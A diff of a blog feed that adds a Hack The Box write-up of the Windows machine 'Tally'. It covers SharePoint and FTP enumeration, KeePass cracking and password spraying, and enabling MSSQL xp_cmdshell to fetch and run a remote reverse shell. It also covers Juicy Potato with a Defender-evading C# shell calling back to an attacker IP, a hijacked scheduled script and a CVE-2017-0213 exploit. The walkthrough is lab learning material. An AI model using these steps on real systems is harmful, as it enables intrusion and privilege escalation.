@@ -1,4 +1,467 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-05T12:46:25+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Hard] - Kotarak</title><link href="http://localhost:4000/2022/08/26/Kotarak.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Kotarak" /><published>2022-08-26T00:00:00+02:00</published><updated>2022-08-26T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/26/Kotarak</id><content type="html" xml:base="http://localhost:4000/2022/08/26/Kotarak.html"><![CDATA[<p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-07T14:30:57+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Hard] - Tally</title><link href="http://localhost:4000/2022/08/31/Tally.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Tally" /><published>2022-08-31T00:00:00+02:00</published><updated>2022-08-31T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/31/Tally</id><content type="html" xml:base="http://localhost:4000/2022/08/31/Tally.html"><![CDATA[<p><img src="/assets/Tally/Tally.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Tally</strong> is a great box with <strong>multiple exploit paths</strong> for both <strong>initial access</strong> as well as <strong>privilege escalation.</strong></li>
+  <li><em>Intially,</em> we find a <strong>SharePoint site</strong> on port 80 which we enumerate to find <strong>a page with a couple of interesting bits of information.</strong></li>
+  <li><strong>One: being credentials for the listening FTP service.</strong></li>
+  <li><strong>Two: being intel</strong> about an <strong>HTML document</strong> to be <strong>uploaded to the FTP share for review</strong> by another user.</li>
+  <li><em>After successfully logging into FTP,</em> we find an <strong>installer for a specific version of Firefox</strong> which was <strong>vulnerable to an RCE vulnerability.</strong></li>
+  <li><em>Having confirmed that the victim was using that version,</em> we <strong>planted a malicious HTML payload</strong> but <strong>failed to get code execution</strong> due to the <strong><em>inconsistency of the exploit. (this part is covered last <a href="#chasing-the-firefox-exploit-down-a-rabbit-hole">here</a>)</em></strong></li>
+  <li><em>Moving along,</em> we went through <strong>FTP</strong> to find a <strong>KeePass database file</strong> which we crack open and gain <strong>creds for an SMB share</strong>.</li>
+  <li><em>On it,</em> we find a <strong>custom binary</strong> that <strong>contained credentials</strong> for the <code class="language-plaintext highlighter-rouge">sa</code> database user on the running <strong>MSSQL instance.</strong></li>
+  <li><em>After logging in using the</em> <code class="language-plaintext highlighter-rouge">sqsh</code> <em>command-line utility,</em> we enabled the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> feature and were able to <strong>execute a reverse shell</strong> and get on the system as the <code class="language-plaintext highlighter-rouge">sarah</code> user.</li>
+  <li><em>Having gained access through MSSQL,</em> we had the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled which we easily <strong>exploited using Juicy Potato</strong> to escalate our privileges to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\System</code>.</li>
+  <li>There was <strong>another unintended path</strong> for privesc using a <strong>modifiable PowerShell script</strong> that was on <code class="language-plaintext highlighter-rouge">sarah</code>’s desktop <strong>running as a scheduled task</strong> under the <code class="language-plaintext highlighter-rouge">Administrator</code> user.</li>
+  <li>We <strong>added our payload to that script</strong> and <strong>owned the box a second way.</strong></li>
+  <li>A third path <strong><em>-which was the intended one-</em></strong> was using <strong>CVE-2017-0213</strong>. We found the <strong>C++ PoC</strong> for it <strong>on GitHub</strong> but couldn’t compile it at first due to an error.</li>
+  <li>We <strong>did some research</strong> and were able to <strong>build the exploit binary</strong>. The <strong>exploitation was tricky</strong> because only the <strong>x86 version of the binary worked</strong> as well as <strong>had the requirement of running as an interactive process.</strong> Which we achieved with <strong>a Meterpreter session.</strong></li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE            VERSION
+21/tcp    open  ftp                Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http               Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-generator: Microsoft SharePoint
+| http-title: Site doesn't have a title (text/html; charset=utf-8).
+|_Requested resource was http://tally/_layouts/15/start.aspx#/default.aspx
+81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+808/tcp   open  ccproxy-http?
+1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2022-08-23T12:49:21
+|_Not valid after:  2052-08-23T12:49:21
+|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
+5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+15567/tcp open  http               Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Negotiate
+|_  NTLM
+| http-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+|_http-title: Site doesn't have a title.
+32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
+| Subject Alternative Name: DNS:localhost, DNS:tally
+| Not valid before: 2017-09-17T22:51:16
+|_Not valid after:  9999-01-01T00:00:00
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-title: Service Unavailable
+32846/tcp open  storagecraft-image StorageCraft Image Manager
+47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc              Microsoft Windows RPC
+49665/tcp open  msrpc              Microsoft Windows RPC
+49666/tcp open  msrpc              Microsoft Windows RPC
+49667/tcp open  msrpc              Microsoft Windows RPC
+49668/tcp open  msrpc              Microsoft Windows RPC
+49669/tcp open  msrpc              Microsoft Windows RPC
+49670/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| ms-sql-info: 
+|   10.10.10.59:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2016 RTM
+|       number: 13.00.1601.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| smb2-time: 
+|   date: 2022-08-23T13:00:42
+|_  start_date: 2022-08-23T12:49:00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us a bunch of information:</p>
+<ol>
+  <li><strong>FTP</strong> port open</li>
+  <li>There’s a <strong>Microsoft SharePoint</strong> Instance on port 80</li>
+  <li><strong>RPC</strong> and <strong>SMB</strong> are available on their standard ports</li>
+  <li><strong>MSSQL</strong> is there on default port 1433</li>
+  <li><strong>WinRM</strong> available</li>
+  <li>An <strong>unknown HTTP port</strong> on 15567</li>
+  <li>Also <strong>81, 808 and 32846</strong> which don’t look familiar</li>
+</ol>
+
+<p><em>to</em> <strong><em>avoid unnecessary confusion,</em></strong> we’ll <strong>start with the ports we know first..</strong></p>
+
+<h2 id="quick-ftp-check">Quick FTP Check</h2>
+<p>we first <strong>pass by FTP</strong> looking for <strong><em>freebies</em></strong> :)</p>
+
+<p><img src="/assets/Tally/no-ftp-anon.jpg" alt="" /></p>
+
+<p><strong>anonymous login</strong> wasn’t allowed.</p>
+
+<h2 id="enumerating-sharepoint">Enumerating Sharepoint</h2>
+<p><em>Checking the website,</em> we get redirected to <code class="language-plaintext highlighter-rouge">/_layouts/15/start.aspx#/default.aspx</code> which had nothing.</p>
+
+<p><img src="/assets/Tally/sharepoint-home-page.jpg" alt="" /></p>
+
+<p><em>But, To</em> <strong><em>properly enumerate SharePoint,</em></strong> we need a <strong>wordlist</strong> for its web directories.</p>
+
+<p>This <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt">one</a> from the <strong>SecLists Repository</strong> seemed good.</p>
+
+<p>We launched <code class="language-plaintext highlighter-rouge">gobuster</code> specifying the <code class="language-plaintext highlighter-rouge">--timeout</code> flag to <strong>60 seconds</strong> since <strong>SharePoint was very slow :/</strong></p>
+
+<p><img src="/assets/Tally/gobuster.jpg" alt="" /></p>
+
+<p><em>Out of the many pages,</em> one was special: <code class="language-plaintext highlighter-rouge">/_layouts/15/viewlsts.aspx</code></p>
+
+<p><img src="/assets/Tally/sharepoint-file-list.jpg" alt="" /></p>
+
+<p>The <strong>“Documents”</strong> list had something interesting</p>
+
+<p><img src="/assets/Tally/documents-sub-site.jpg" alt="" /></p>
+
+<p><em>When we opened the file,</em> we found ourselves a <strong>password :)</strong></p>
+
+<p><img src="/assets/Tally/ftp-details-document.jpg" alt="" /></p>
+
+<p>the <strong>“Site Pages”</strong> list also had something:</p>
+
+<p><img src="/assets/Tally/site-pages-list.jpg" alt="" /></p>
+
+<p><strong>a lot of information was there</strong></p>
+
+<p><img src="/assets/Tally/migration-update-note.jpg" alt="" /></p>
+
+<ul>
+  <li>we got 4 <strong>usernames:</strong> <code class="language-plaintext highlighter-rouge">rahul</code>, <code class="language-plaintext highlighter-rouge">ftp_user</code>, <code class="language-plaintext highlighter-rouge">sarah</code> &amp; <code class="language-plaintext highlighter-rouge">tim</code></li>
+  <li>we now know <code class="language-plaintext highlighter-rouge">rahul</code> is <strong><em>expected to put</em></strong> an <code class="language-plaintext highlighter-rouge">index.html</code> file up on the <code class="language-plaintext highlighter-rouge">Intranet</code> folder on the FTP share which either <code class="language-plaintext highlighter-rouge">sarah</code> or <code class="language-plaintext highlighter-rouge">tim</code> will open.</li>
+</ul>
+
+<p>This is could very well be a <strong>client-side attack vector.</strong></p>
+
+<p><em>but first,</em> let’s <strong>test those credentials</strong> against both <strong>SMB and FTP</strong></p>
+
+<p><img src="/assets/Tally/smb-worked-for-ftp-user.jpg" alt="" /></p>
+
+<p><strong>SMB worked</strong>. but there were <strong>no permissions over any shares.</strong></p>
+
+<p><img src="/assets/Tally/no-shares-available.jpg" alt="" /></p>
+
+<p><strong>Enumerating local users</strong> with the <code class="language-plaintext highlighter-rouge">--users</code> flag failed.</p>
+
+<p><img src="/assets/Tally/user-enumeration.jpg" alt="" /></p>
+
+<p>But <strong>RID brute-forcing</strong> worked and got us <strong>every user on the box</strong>. This might come in handy.</p>
+
+<p><img src="/assets/Tally/user-enumeration-rid-brute.jpg" alt="" /></p>
+
+<p><strong>that was it</strong> for <strong>SMB.</strong></p>
+
+<p>We then <strong>tested the creds with FTP</strong> and found the <code class="language-plaintext highlighter-rouge">ftp_user</code> valid -as expected-.</p>
+
+<p><img src="/assets/Tally/ftp-access-confirmed-hydra.jpg" alt="" /></p>
+
+<h2 id="ftp-share-enumeration">FTP Share Enumeration</h2>
+
+<p><img src="/assets/Tally/ftp-directories.jpg" alt="" /></p>
+
+<p><em>After</em> <strong><em>browsing the share</em></strong> and <strong><em>finding a lot of files/folders there,</em></strong> we decided to <strong>download it</strong>. For both <strong>speed</strong> and <strong>for leveraging tools like</strong> <code class="language-plaintext highlighter-rouge">find</code> <strong>for search and what not.</strong></p>
+
+<p>we do so with <code class="language-plaintext highlighter-rouge">wget</code>’s <code class="language-plaintext highlighter-rouge">-m</code> flag <strong><em>(for mirroring).</em></strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="nt">-m</span> ftp://ftp_user:<span class="s1">'UTDRSCH53c"$6hys'</span>@tally
+</code></pre></div></div>
+
+<p><em>while browsing the contents,</em> we found a <strong>KeePass file</strong> in <code class="language-plaintext highlighter-rouge">tim</code>’s folder.</p>
+
+<p><img src="/assets/Tally/keepass-file-found.jpg" alt="" /></p>
+
+<p>we <strong>converted it to a hash</strong> using <code class="language-plaintext highlighter-rouge">keepass2john</code> and <strong>cracked it.</strong></p>
+
+<p><img src="/assets/Tally/keepass-pass-cracked.jpg" alt="" /></p>
+
+<p>we carried the <code class="language-plaintext highlighter-rouge">.kdbx</code> file over <strong>to our windows VM</strong> along with the <strong>KeePass program files</strong> that were on the share then <strong>ran the application.</strong></p>
+
+<p><em>Inside,</em> we found <strong>a password for a share called ACCT</strong> (<em>we saw that earlier when enumerating SMB</em>)</p>
+
+<p><img src="/assets/Tally/keepass-passwords.jpg" alt="" /></p>
+
+<p>and <strong>another password</strong> that is <em>most likely</em> for <strong>a Cisco product.</strong></p>
+
+<p><img src="/assets/Tally/cisco-password.jpg" alt="" /></p>
+
+<p><em>Automatically,</em> we <strong>shuffle the usernames/passwords</strong> and <strong>spray</strong></p>
+
+<p><img src="/assets/Tally/spray-and-finance-share-access.jpg" alt="" /></p>
+
+<p>The creds for the <code class="language-plaintext highlighter-rouge">finance</code> user worked and we <strong>got access to the ACCT share.</strong></p>
+
+<p><img src="/assets/Tally/finance-share-access.jpg" alt="" /></p>
+
+<h2 id="going-through-smb">Going through SMB</h2>
+<p>We <strong>mounted the share</strong> and started looking at the contents.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=Finance,password=Acc0unting'</span> //tally/ACCT finance-smb/
+</code></pre></div></div>
+
+<p><img src="/assets/Tally/mounting-the-smb-share.jpg" alt="" /></p>
+
+<p>A <strong>custom binary</strong> called <code class="language-plaintext highlighter-rouge">tester.exe</code> was in <code class="language-plaintext highlighter-rouge">/zz_Migration/Binaries/New folder</code></p>
+
+<p><img src="/assets/Tally/tester-exe-found.jpg" alt="" /></p>
+
+<p><em>when running</em> <code class="language-plaintext highlighter-rouge">strings</code> <em>against it,</em> we found <strong>creds</strong> inside:</p>
+
+<p><img src="/assets/Tally/db-password-found.jpg" alt="" /></p>
+
+<h2 id="getting-a-shell-through-mssql">Getting a shell through MSSQL</h2>
+<p>The creds worked when we <strong>connected to MSSQL</strong> on port 1433 using the <code class="language-plaintext highlighter-rouge">sqsh</code> tool.</p>
+
+<p><em>However, to execute commands on the system,</em> we needed to <strong>enable</strong> the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> feature which was <strong>initially unavailable</strong>.</p>
+
+<p><em>At first,</em> it was set as an “<code class="language-plaintext highlighter-rouge">advanced option</code>”.</p>
+
+<p>so we <strong>reconfigured the shell</strong> to “<code class="language-plaintext highlighter-rouge">show advanced options</code>” and could then <strong>re-enable</strong> <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> using the commands below:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="s1">'1'</span>
+<span class="n">reconfigure</span>
+<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="s1">'1'</span>
+<span class="n">reconfigure</span>
+<span class="n">xp_cmdshell</span> <span class="s1">'whoami'</span>
+</code></pre></div></div>
+
+<p>here’s how it looked <em>(notice the error messages and results after running the commands)</em>:</p>
+
+<p><img src="/assets/Tally/enabling-xp-cmd-shell-mssql.jpg" alt="" /></p>
+
+<p><em>After running the</em> <code class="language-plaintext highlighter-rouge">whoami</code> <em>command</em>, we find ourselves executing code as the <code class="language-plaintext highlighter-rouge">sarah</code> user.</p>
+
+<p><strong>Note:</strong> <em>because, over time,</em> <em>the</em> <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> <em>option kept getting</em> <strong><em>automatically disabled</em></strong>, we put the <strong>MSSQL commands in a file</strong> for a <strong>bit of automation.</strong></p>
+
+<p>We added the code to both <strong>re-enable it</strong> and issue a <strong>PowerShell web request</strong> to <strong>execute</strong> a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Nishang Reverse Shell</a> hosted on our web server to streamline the process in case we lost our shell.</p>
+
+<p><img src="/assets/Tally/shell-as-sarah.jpg" alt="" /></p>
+
+<p>We now had a <strong>proper shell</strong> as <code class="language-plaintext highlighter-rouge">sarah</code></p>
+
+<h2 id="privesc-path-1-abusing-the-seimpersonateprivilege">Privesc Path #1: Abusing the SeImpersonatePrivilege</h2>
+
+<p><em>Since we got in through</em> <strong><em>MSSQL,</em></strong> we had the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> enabled.</p>
+
+<p><img src="/assets/Tally/se-impersonate-enabled.jpg" alt="" /></p>
+
+<p>That privilege is <strong>ripe for exploitation</strong> using <strong>Juicy Potato</strong>.</p>
+
+<p><em>To abuse it,</em> we <strong>downloaded the binary</strong> from <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">Github</a> and renamed it to <code class="language-plaintext highlighter-rouge">jp.exe</code></p>
+
+<p><em>From our experience,</em> that exploit <strong>always worked</strong> when used with a <strong>single executable</strong> rather than <strong>passing arguments</strong>.</p>
+
+<p><em>for that,</em> our choice is going to be a <a href="https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc">C# reverse shell</a></p>
+
+<p>Why? because that shell is <strong>good for bypassing Windows Defender</strong></p>
+
+<p>We know <strong>defender was enabled</strong> from the <strong>hint</strong> in the <code class="language-plaintext highlighter-rouge">todo.txt</code> file on <code class="language-plaintext highlighter-rouge">sarah</code>’s desktop:</p>
+
+<p><img src="/assets/Tally/windows-defender-hint.jpg" alt="" /></p>
+
+<p>we can <strong>confirm</strong> that with the <strong>PowerShell cmdlet</strong> <code class="language-plaintext highlighter-rouge">Get-MpComputerStatus</code></p>
+
+<p><img src="/assets/Tally/real-time-protection-enabled.jpg" alt="" /></p>
+
+<p>We <strong>modify the shell</strong> with our <strong>IP and port</strong></p>
+<pre><code class="language-C#">// SNIP //
+TcpClient client = new TcpClient("10.10.16.4", 9001)
+// SNIP //
+</code></pre>
+
+<p>And then <strong>compile the code (rev.cs)</strong> on the victim machine using the <strong>native .NET compiler</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
+</code></pre></div></div>
+
+<p><strong>Note:</strong> the <strong>compilation errors</strong> weren’t serious here and we got back the exe file.</p>
+
+<p><img src="/assets/Tally/compilin-csharp-rev.jpg" alt="" /></p>
+
+<p><em>after running</em> <strong>Juicy Potato</strong> <em>with our</em> <code class="language-plaintext highlighter-rouge">rev.exe</code> <em>as an argument,</em> it connected back to us as <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
+</code></pre></div></div>
+
+<p><img src="/assets/Tally/juicy-potato-to-system-rev-shell.jpg" alt="" /></p>
+
+<h2 id="privesc-path-2-modifying-the-scheduled-powershell-script">Privesc Path #2: Modifying the Scheduled PowerShell Script</h2>
+<p><em>Also on</em> <code class="language-plaintext highlighter-rouge">sarah</code><em>’s desktop,</em> there was a <strong>Powershell script</strong> called <code class="language-plaintext highlighter-rouge">SPBestWarmup.ps1</code> and <strong>another XML file</strong> with the same name <code class="language-plaintext highlighter-rouge">SPBestWarmup.xml</code></p>
+
+<p><img src="/assets/Tally/spwarmup-scripts.jpg" alt="" /></p>
+
+<p><em>when looking at the XML file,</em> we notice something:</p>
+
+<p><img src="/assets/Tally/spwarmup-xml-contents.jpg" alt="" /></p>
+
+<p><strong>these options</strong> indicate that <strong>this script is part of a scheduled task.</strong></p>
+
+<p><em>To exploit this,</em> we need to <strong>check for write permissions</strong> on it. So we ran a quick <code class="language-plaintext highlighter-rouge">Get-ACL</code> <strong>PowerShell command</strong>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ACL</span><span class="w"> </span><span class="o">.</span><span class="nx">\SPBestWarmup.ps1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Expand</span><span class="w"> </span><span class="nx">AccessToString</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/Tally/write-access-to-script.jpg" alt="" /></p>
+
+<p><strong>We have full control!</strong></p>
+
+<p>We went ahead and <strong>added a reverse shell</strong> to that script right away.</p>
+
+<p><em>However, because it was configured to run</em> <strong><em>every hour,</em></strong> we had to wait for it…</p>
+
+<p>But we eventually <strong>received a shell</strong> as <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+
+<p><img src="/assets/Tally/shell-as-administrator.jpg" alt="" /></p>
+
+<h2 id="privesc-path-3-cve-2017-0213">Privesc Path #3: CVE-2017-0213</h2>
+<p><em>After taking over the machine using the above two ways, and while looking at the</em> <a href="https://app.hackthebox.com/machines/Tally/walkthroughs">Official Writeup</a>, I found that <strong><em>exploiting CVE-2017-0213</em></strong> was <strong><em>the intended path.</em></strong></p>
+
+<p>The <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp">source code</a> for it was <strong>to be compiled in Visual Studio.</strong></p>
+
+<p><em>when building the binary without any modifications,</em> we get a <strong>type error</strong>.</p>
+
+<p><img src="/assets/Tally/eop-cve-compile-error.jpg" alt="" /></p>
+
+<p><em>On Google,</em> we queried with <strong>both the error as well as the variable name</strong> to get the <strong>most relevant results</strong></p>
+
+<p><img src="/assets/Tally/google-stackoverflow.jpg" alt="" /></p>
+
+<p>The <strong>first result</strong> happened to be <strong>for the exact exploit</strong>. Here was <strong>the solution:</strong></p>
+
+<p><img src="/assets/Tally/exploit-error-fix.jpg" alt="" /></p>
+
+<p><em>After applying the fix,</em> we edited the <code class="language-plaintext highlighter-rouge">cmdline</code> variable and <strong>inserted our shell’s path</strong> instead.</p>
+
+<p>That’s because the <strong>default exploit code ran</strong>  <code class="language-plaintext highlighter-rouge">cmd.exe</code> which is <strong>just a Proof of Concept.</strong></p>
+
+<p>We make sure to <strong>select the x86 process architecture</strong> (<em>the 64-bit version didn’t work</em>)</p>
+
+<p><img src="/assets/Tally/cpp-build-succeeded.jpg" alt="" /></p>
+
+<p>Running the exploit <strong>from a normal shell</strong> wouldn’t do the trick.</p>
+
+<p>That’s because <strong>it requires an interactive process</strong> <em>to do its magic.</em></p>
+
+<p><em>To achieve that,</em> we must get a <strong>Meterpreter shell.</strong></p>
+
+<p>We will first <strong>start a Metasploit handler</strong> on our Kali box.</p>
+
+<p><em>And, on Tally,</em> we will use <strong>PowerShell</strong>’s <code class="language-plaintext highlighter-rouge">start-process</code> command with the <code class="language-plaintext highlighter-rouge">rev.exe</code> binary to <strong>fork out from our shell</strong> and <strong>connect back to our listener.</strong></p>
+
+<p><em>Once we catch the shell,</em> we can <strong>upgrade it</strong> using the <code class="language-plaintext highlighter-rouge">sessions -u</code> command.</p>
+
+<p><img src="/assets/Tally/upgrade-to-meterpreter.jpg" alt="" /></p>
+
+<p><em>Now,</em> getting into an “interactive process” can be easily achieved by <strong>migrating to a process with session ID = 1</strong></p>
+
+<p>we choose <code class="language-plaintext highlighter-rouge">svchost.exe</code> because it should be a <strong>stable process.</strong></p>
+
+<p><img src="/assets/Tally/migration-done.jpg" alt="" /></p>
+
+<p><em>After migrating,</em> we <strong>drop into a cmd shell</strong> with the <code class="language-plaintext highlighter-rouge">shell</code> command and <strong>launch the exploit</strong> to <strong>get a connection back</strong> as <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+
+<p><img src="/assets/Tally/cve-eop-worked.jpg" alt="" /></p>
+
+<p>it was <strong>very difficult to figure out</strong>. But we <strong>ended up learning a new privesc technique :D</strong></p>
+
+<h2 id="chasing-the-firefox-exploit-down-a-rabbit-hole">Chasing the Firefox Exploit down a Rabbit Hole</h2>
+
+<p><em>when we went into the</em> <code class="language-plaintext highlighter-rouge">Intranet</code> <em>folder (mentioned in the note on SharePoint),</em> we found a sub-folder called <code class="language-plaintext highlighter-rouge">binaries</code>.</p>
+
+<p>It contained a <strong>certain version of Firefox.</strong></p>
+
+<p><img src="/assets/Tally/3-exploits-for-vuln-firefox.jpg" alt="" /></p>
+
+<p>When using <code class="language-plaintext highlighter-rouge">searchsploit</code>, we got a <strong>couple of exploits</strong> for it.</p>
+
+<p><img src="/assets/Tally/firefox-searchsploit.jpg" alt="" /></p>
+
+<p>Our <strong>theory</strong> had a few parts:</p>
+
+<ul>
+  <li><strong>Finding this installer</strong> meant that <strong>there’s a high chance</strong> it was being <strong>used in the environment.</strong></li>
+  <li>And since either <code class="language-plaintext highlighter-rouge">sarah</code> or <code class="language-plaintext highlighter-rouge">tim</code> would be checking an <code class="language-plaintext highlighter-rouge">index.html</code> from <code class="language-plaintext highlighter-rouge">rahul</code>, they would <strong>likely be using that version of Firefox</strong> to do so.</li>
+  <li>And that’s where the exploit should come in.</li>
+</ul>
+
+<p><em>To confirm our theory,</em> we uploaded an <code class="language-plaintext highlighter-rouge">index.html</code> to the <code class="language-plaintext highlighter-rouge">intranet</code> folder <strong>setting it up to redirect to our Kali.</strong></p>
+
+<p><img src="/assets/Tally/index-html-redirect.jpg" alt="" /></p>
+
+<p>We have to use the <strong>binary mode in FTP</strong> to <strong>avoid any corruption in-transit.</strong></p>
+
+<p><img src="/assets/Tally/ftp-binary-upload.jpg" alt="" /></p>
+
+<p><em>After a couple of minutes,</em> we <strong>got our confirmation</strong> from the <code class="language-plaintext highlighter-rouge">user-agent</code> HTTP header.</p>
+
+<p><img src="/assets/Tally/victim-firefox-version-confirmed.jpg" alt="" /></p>
+
+<p><em>to choose an exploit,</em> we first <strong>checked the Metasploit module</strong> because the framework’s exploits are <strong>usually well-developed</strong>.</p>
+
+<p><em>Sadly,</em> it <strong>did’t match our target’s version.</strong></p>
+
+<p><img src="/assets/Tally/MSF-firefox-exploit-no-match.jpg" alt="" /></p>
+
+<p>We then turned to the one with the <strong>exact version match</strong> <a href="https://www.exploit-db.com/exploits/44294">here</a>.</p>
+
+<p><img src="/assets/Tally/edb-firefox-exploit-verified.jpg" alt="" /></p>
+
+<p>it was <strong>verified on EDB.</strong> and <strong>it did work well in testing</strong>. <strong><em>But only with</em></strong> the <code class="language-plaintext highlighter-rouge">calc.exe</code> <strong>payload :/</strong></p>
+
+<p><img src="/assets/Tally/calc-works-ff-exploit.jpg" alt="" /></p>
+
+<p><em>no matter how many shellcodes we generated using</em> <code class="language-plaintext highlighter-rouge">sc2asmjs.py</code>. None worked :X</p>
+
+<p><img src="/assets/Tally/ff-exploit-instructions.jpg" alt="" /></p>
+
+<p>this <a href="https://www.exploit-db.com/exploits/42484">version</a> on <strong>Exploit-DB</strong> did work. <strong><em>But after payload modification and many many tries…</em></strong></p>
+
+<p><em>If you’re interested in checking it out.</em> you can view it on the <a href="https://app.hackthebox.com/machines/Tally/walkthroughs">Official Writeup</a></p>
+
+<p><strong>Tough machine, huh?</strong></p>
+
+<p><strong>Hope you enjoyed :)</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Hard] - Kotarak</title><link href="http://localhost:4000/2022/08/26/Kotarak.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Kotarak" /><published>2022-08-26T00:00:00+02:00</published><updated>2022-08-26T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/26/Kotarak</id><content type="html" xml:base="http://localhost:4000/2022/08/26/Kotarak.html"><![CDATA[<p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -1036,7 +1499,7 @@ lxc image delete myimage
 
